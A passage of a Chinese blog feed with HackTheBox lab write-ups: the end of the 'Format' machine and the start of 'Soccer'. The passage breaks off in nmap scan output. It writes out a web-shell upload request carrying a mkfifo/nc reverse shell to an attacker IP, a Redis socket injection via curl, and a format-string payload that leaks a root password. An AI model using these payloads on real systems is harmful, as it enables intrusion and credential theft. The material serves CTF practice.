<span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">,</span> <span class="token constant">FILE_IGNORE_NEW_LINES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$html_content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$order</span> <span class="token keyword">as</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$html_content</span><span class="token punctuation">;</span>        <span class="token variable">$html_content</span> <span class="token operator">=</span> <span class="token variable">$temp</span> <span class="token punctuation">.</span> <span class="token string">"&lt;div class = \"{$line} blog-indiv-content\">"</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$html_content</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>​<img src="/Blogimages/HTB_Format/image-20230604093957-nqxbvsb.png" alt="image">​</p><p>这里是可以写文件的，因为两个地方我们都可控</p><p>用官方的一个例子来看：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'23'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// the content of 'data.txt' is now 123 and not 23!</span><span class="token delimiter">?></span> </code></pre><p>运行这段代码会生成一个<code>data.txt</code>​，内容为<code>123</code>​</p><p>​<img src="/Blogimages/HTB_Format/image-20230604094605-scvilvp.png" alt="image">​</p><p>我们在<code>http://qingfeng.microblog.htb/edit/</code>​：</p><p>​<img src="/Blogimages/HTB_Format/image-20230604101954-dr8f2cx.png" alt="image">​</p><p>随便抓点东西改个包：</p><pre class=" language-xml"><code class="language-xml">POST /edit/index.php HTTP/1.1Host: qingfeng.microblog.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 161Origin: http://qingfeng.microblog.htbConnection: closeCookie: username=vh07299t0o4p25dj4qhhirpa1bUpgrade-Insecure-Requests: 1id=/var/www/microblog/qingfeng/uploads/1.php&amp;txt=&lt;%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.8+9999+>/tmp/f")%3b%3f></code></pre><p><strong>发现我们并不能写入文件，为什么？</strong></p><p>先来说为什么要是<code>/var/www/microblog/qingfeng/uploads/1.php</code>​这个路径，注意到<code>/edit/index.php</code>​中这样一段代码：</p><p>​<img src="/Blogimages/HTB_Format/image-20230604102419-r6ub38u.png" alt="image">​</p><p>它创建了&#x2F;uploads目录并且我们有写入的权限，那为什么还是无法写入呢，可以注意到这里有一个前提条件，<code>isPro()===&quot;true&quot;</code>​</p><p>再看看<code>isPro()函数</code>​</p><p>​<img src="/Blogimages/HTB_Format/image-20230604103620-8tnb553.png" alt="image">​</p><p>如果这里的<code>username</code>​用户的<code>pro</code>​字段不存在值，就不满足true</p><p>所以我们要让redis中存在，就可以用：</p><pre class=" language-bash"><code class="language-bash">curl -X HSET <span class="token string">"http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:qingfeng%20pro%20true%20a/b"</span></code></pre><p>使得它存在，<code>-X</code>​的意思是使用什么方法请求，例如<code>GET</code>​，<code>POST</code>​，但是为什么这样子可以和<code>redis</code>​数据库交互确实不知</p><p>再次发送数据包，请求<code>/qingfeng/uploads/1.php</code>​就可以吃到反弹shell了：</p><p>​<img src="/Blogimages/HTB_Format/image-20230604104736-i99zzhk.png" alt="image">​</p><p>这里反弹shell是利用的<code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+10.10.14.8+9999+&gt;/tmp/f</code>​,因为目标环境没有<code>nc -e</code>​,当然你也可以写马之类的连接webshell，看个人喜好</p><p>这里的反弹shell的意思分析如下：</p><p>​​<img src="/Blogimages/HTB_Format/image-20230604104936-5wydftk.png" alt="image">​​</p><p>接下来就是如何提权了</p><p>信息收集一波：</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/fusermount/usr/bin/passwd/usr/bin/su/usr/bin/umount/usr/bin/sudo/usr/bin/chfn/usr/bin/chsh/usr/bin/mount/usr/bin/gpasswd$ <span class="token function">netstat</span> -lActive Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>Proto Recv-Q Send-Q Local Address           Foreign Address         State    tcp        0      0 localhost:9000          0.0.0.0:*               LISTEN   tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN   tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN   tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN   tcp6       0      0 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:http               <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                  LISTEN   tcp6       0      0 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:ssh                <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                  LISTEN   tcp6       0      0 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:3000               <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                  LISTEN   udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                        Active UNIX domain sockets <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>Proto RefCnt Flags       Type       State         I-Node   Pathunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11327    /run/systemd/privateunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11329    /run/systemd/userdb/io.systemd.DynamicUserunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11330    /run/systemd/io.system.ManagedOOMunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11800    /var/run/vmware/guestServicePipeunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11340    /run/systemd/fsck.progressunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11894    /run/dbus/system_bus_socketunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11348    /run/systemd/journal/stdoutunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     SEQPACKET  LISTENING     11350    /run/udev/controlunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     11489    /run/systemd/journal/io.systemd.journalunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     13597    /var/run/redis/redis.sockunix  2      <span class="token punctuation">[</span> ACC <span class="token punctuation">]</span>     STREAM     LISTENING     13611    /run/php/php7.4-fpm.sock</code></pre><p>发现有一个<code>/var/run/redis/redis.sock</code>​,我们可以连接redis</p><p>获取所有的键：</p><pre class=" language-bash"><code class="language-bash">$ redis-cli -s var/run/redis/redis.sockKEYS *cooper.dooper:sitescooper.dooper</code></pre><p>Redis 的Hgetall 命令用于返回哈希表中，所有的字段和值</p><p>我们依次获取：</p><p>​<img src="/Blogimages/HTB_Format/image-20230604110806-t5sucnv.png" alt="image">​</p><p>得到了用户名和密码，可以ssh登陆：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">ssh</span> cooper@format       cooper@format's password: Linux <span class="token function">format</span> 5.10.0-22-amd64 <span class="token comment" spellcheck="true">#1 SMP Debian 5.10.178-3 (2023-04-22) x86_64</span>The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> theindividual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jun  4 02:46:12 2023 from 10.10.16.46cooper@format:~$</code></pre><p>ssh可以登陆那么第一件事情就是<code>sudo -l</code>​提权了</p><pre class=" language-bash"><code class="language-bash">cooper@format:~$ <span class="token function">sudo</span> -l<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> cooper: Sorry, try again.<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> cooper: Sorry, try again.<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> cooper: Matching Defaults entries <span class="token keyword">for</span> cooper on format:    env_reset, mail_badpass,    secure_path<span class="token operator">=</span>/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser cooper may run the following commands on format:    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/license</code></pre><p>有一个license，不知道是什么东西，直接输入看看</p><pre class=" language-bash"><code class="language-bash">cooper@format:~$ <span class="token function">sudo</span> /usr/bin/license usage: license <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">(</span>-p username <span class="token operator">|</span> -d username <span class="token operator">|</span> -c license_key<span class="token punctuation">)</span>license: error: one of the arguments -p/--provision -d/--deprovision -c/--check is required</code></pre><p>cat看看，发现是一个python脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>kdf<span class="token punctuation">.</span>pbkdf2 <span class="token keyword">import</span> PBKDF2HMAC<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>fernet <span class="token keyword">import</span> Fernet<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">from</span> datetime <span class="token keyword">import</span> date<span class="token keyword">import</span> redis<span class="token keyword">import</span> argparse<span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation        self<span class="token punctuation">.</span>license <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>created <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Microblog license key manager can only be run as root"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Microblog license key manager'</span><span class="token punctuation">)</span>group <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--provision'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Provision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--deprovision'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Deprovision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--check'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Check if specified license key is valid'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'license_key'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>unix_socket_path<span class="token operator">=</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span>secret <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> open<span class="token punctuation">(</span><span class="token string">"/root/license/secret"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>secret_encoded <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>salt <span class="token operator">=</span> b<span class="token string">'microblogsalt123'</span>kdf <span class="token operator">=</span> PBKDF2HMAC<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>salt<span class="token operator">=</span>salt<span class="token punctuation">,</span>iterations<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">,</span>backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>encryption_key <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>kdf<span class="token punctuation">.</span>derive<span class="token punctuation">(</span>secret_encoded<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> Fernet<span class="token punctuation">(</span>encryption_key<span class="token punctuation">)</span>l <span class="token operator">=</span> License<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#provision</span><span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>    user_profile <span class="token operator">=</span> r<span class="token punctuation">.</span>hgetall<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> user_profile<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"User does not exist. Please provide valid username."</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    existing_keys <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    all_keys <span class="token operator">=</span> existing_keys<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> user_key <span class="token keyword">in</span> all_keys<span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>user_key<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key has already been provisioned for this user"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    prefix <span class="token operator">=</span> <span class="token string">"microblog"</span>    username <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    firstlast <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"first-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"last-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    license_key <span class="token operator">=</span> <span class="token punctuation">(</span>prefix <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"{license.license}"</span> <span class="token operator">+</span> firstlast<span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>license<span class="token operator">=</span>l<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plaintext license key:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    license_key_encoded <span class="token operator">=</span> license_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    license_key_encrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>license_key_encoded<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Encrypted license key (distribute to customer):"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> license_keys_file<span class="token punctuation">:</span>        license_keys_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#deprovision</span><span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>deprovision<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key deprovisioning coming soon"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#check</span><span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        license_key_decrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key valid! Decrypted value:"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key invalid"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p>帮助文档看一看：</p><pre class=" language-bash"><code class="language-bash">cooper@format:~$ <span class="token function">sudo</span> /usr/bin/license -husage: license <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">(</span>-p username <span class="token operator">|</span> -d username <span class="token operator">|</span> -c license_key<span class="token punctuation">)</span>Microblog license key manageroptional arguments:  -h, --help            show this <span class="token function">help</span> message and <span class="token keyword">exit</span>  -p username, --provision username                        Provision license key <span class="token keyword">for</span> specified user  -d username, --deprovision username                        Deprovision license key <span class="token keyword">for</span> specified user  -c license_key, --check license_key                        Check <span class="token keyword">if</span> specified license key is valid</code></pre><p>我们再redis中创建一个用户，利用模板注入读取密钥：</p><pre class=" language-bash"><code class="language-bash">HMSET qingfeng first-name <span class="token string">"{license.__init__.__globals__[secret_encoded]}"</span> last-name qingfeng username qingfeng</code></pre><p>‍</p><pre class=" language-bash"><code class="language-bash">cooper@format:~$ <span class="token function">sudo</span> /usr/bin/license -p qingfengPlaintext license key:------------------------------------------------------microblogqingfengH<span class="token operator">&lt;</span>SZFa~t<span class="token string">"7C3[+}1m<span class="token variable">$j</span>"</span>6m<span class="token punctuation">;</span>h<span class="token operator">!</span>@3YBRHf_y@Z4<span class="token operator">&amp;</span>gUb<span class="token string">'unCR4ckaBL3Pa$<span class="token variable">$w0rd</span>'</span>qingfengEncrypted license key <span class="token punctuation">(</span>distribute to customer<span class="token punctuation">)</span>:------------------------------------------------------gAAAAABkfATWk-3TC6uhgKq2MArdozOOf10eC7PRk3KpS7pGh5tFrtJIe81FLGTmmPU-tDfZdcX4w2ywlqatBb21coL8uoYAxWnMg8jh37SCFGTEZZNfva5UjEpkZ5s26T6K6yvc3CdPGH8N-Rr1KCtEQ4DTopaBqIH9R6gVTMj625ReM7iFAqgyP-ycFrzNB0PsN2Dth8F0</code></pre><p>利用<code>unCR4ckaBL3Pa$$w0rd</code>​成功读取root密码拿到最后一个flag</p><pre class=" language-bash"><code class="language-bash">root@format:~<span class="token comment" spellcheck="true"># cat root.txt|cut -c 1-10</span>c9c7fb45bf</code></pre><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB_soccer</title>
      <link href="/2023/05/31/HTB%20soccer/"/>
      <url>/2023/05/31/HTB%20soccer/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-soccer"><a href="#HTB-soccer" class="headerlink" title="HTB soccer"></a>HTB soccer</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 10.10.11.194<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> kali 的密码：Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-30 21:02 CSTWarning: 10.10.11.194 giving up on port because retransmission cap hit <span class="token punctuation">(</span>10<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> 10.10.11.194 <span class="token punctuation">(</span>10.10.11.194<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.17s latency<span class="token punctuation">)</span>.Not shown: 65532 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT     STATE SERVICE22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>80/tcp   <span class="token function">open</span>  http9091/tcp <span class="token function">open</span>  xmltec-xmlmailNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 23.54 seconds</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap -sV -sT -O -p22,80,9091 soccer   Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-30 21:04 CSTNmap scan report <span class="token keyword">for</span> soccer <span class="token punctuation">(</span>10.10.11.194<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.16s latency<span class="token punctuation">)</span>.PORT     STATE SERVICE         VERSION22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>80/tcp   <span class="token function">open</span>  http            nginx 1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>9091/tcp <span class="token function">open</span>  xmltec-xmlmail?1 <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token keyword">:</span>SF-Port9091-TCP:V<span class="token operator">=</span>7.93%I<span class="token operator">=</span>7%D<span class="token operator">=</span>5/30%Time<span class="token operator">=</span>6475F465%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r<span class="token punctuation">(</span>inSF:formix,2F,<span class="token string">"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\rSF:\n\r\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>drda,2F,<span class="token string">"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\xSF:20close\r\n\r\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GetRequest,168,<span class="token 